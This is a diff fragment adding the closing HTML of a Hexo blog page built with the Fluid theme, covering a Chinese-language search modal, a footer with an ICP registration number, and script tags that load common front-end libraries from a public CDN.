+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      赣ICP备2022008842号-2
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
